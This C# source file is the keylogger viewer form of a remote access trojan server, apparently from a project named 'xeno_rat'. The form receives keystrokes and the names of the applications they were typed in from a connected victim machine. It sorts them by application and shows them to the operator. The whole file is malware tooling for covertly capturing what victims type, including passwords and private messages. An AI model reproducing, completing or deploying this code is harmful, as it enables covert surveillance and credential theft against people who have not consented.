using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class KeyLogger : Form
    {
        Node client;
        private string selectedItem = null;
        Dictionary<string, string> applications = new Dictionary<string, string>();

        public KeyLogger(Node _client)
        {
            client = _client;
            InitializeComponent();
            recvThread();
        }

        /// <summary>
        /// Asynchronously receives data from the client and processes it.
        /// </summary>
        /// <remarks>
        /// This method continuously listens for incoming data from the connected client. Upon receiving the data, it processes the application and key information.
        /// If either the application or key data is null, and the form is not disposed, it closes the form.
        /// The received application and key data are then converted to strings using UTF-8 encoding.
        /// If the key is an empty string, the method continues to listen for more data.
        /// If the application is not already in the applications dictionary, it adds a new entry to the list view and initializes the application in the dictionary.
        /// The method then appends the received key to the corresponding application entry in the dictionary.
        /// If the selected item matches the current application, it updates the text box with the normalized key data.
        /// </remarks>
        public async Task recvThread()
        {
            while (client.Connected()) 
            {
                try
                {
                    byte[] application = await client.ReceiveAsync();
                    byte[] key = await client.ReceiveAsync();
                    if (application == null || key == null) 
                    {
                        if (!this.IsDisposed)
                        {
                            this.Invoke((MethodInvoker)(() =>
                            {
                                this.Close();
                            }));
                        }
                    }
                    string strapplication = Encoding.UTF8.GetString(application);
                    string strkey = Encoding.UTF8.GetString(key);
                    if (strkey=="") continue; 
                    if (!applications.ContainsKey(strapplication)) 
                    {
                        listView1.Items.Add(new ListViewItem(strapplication));
                        applications[strapplication] = "";
                    }
                    applications[strapplication] += strkey;
                    if (selectedItem == strapplication) 
                    {
                        textBox1.Text = Normalize(applications[selectedItem]);
                    }
                }
                catch{ }
            }
        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox1.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Occurs when the selected index of the ListView control changes.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Called when the KeyLogger form is loaded.
        /// </summary>
        private void KeyLogger_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Replaces the placeholders [enter] and [space] in the input string with new line and space characters respectively.
        /// </summary>
        /// <param name="input">The input string containing placeholders to be replaced.</param>
        /// <returns>The input string with [enter] replaced by new line characters and [space] replaced by space characters.</returns>
        public string Normalize(string input) 
        {
            return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
        }

        /// <summary>
        /// Handles the event when an item in the list view is activated.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method retrieves the text of the first column of the selected item in the list view.
        /// It then normalizes the corresponding value from the 'applications' dictionary and sets it as the text of 'textBox1'.
        /// </remarks>
        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string firstColumnText = listView1.SelectedItems[0].SubItems[0].Text;
                selectedItem = firstColumnText;
                textBox1.Text = Normalize(applications[firstColumnText]);
            }
        }

        /// <summary>
        /// Event handler for the Click event of label1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method is an event handler for the Click event of label1. It is triggered when the label is clicked.
        /// </remarks>
        private void label1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Click event of the label2 control.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method is an event handler for the Click event of the label2 control.
        /// It is triggered when the label2 control is clicked.
        /// </remarks>
        private void label2_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox1.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method is called when the text in textBox1 is changed. It is typically used to handle any logic or actions that need to be performed when the text changes.
        /// </remarks>
        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }
    }
}
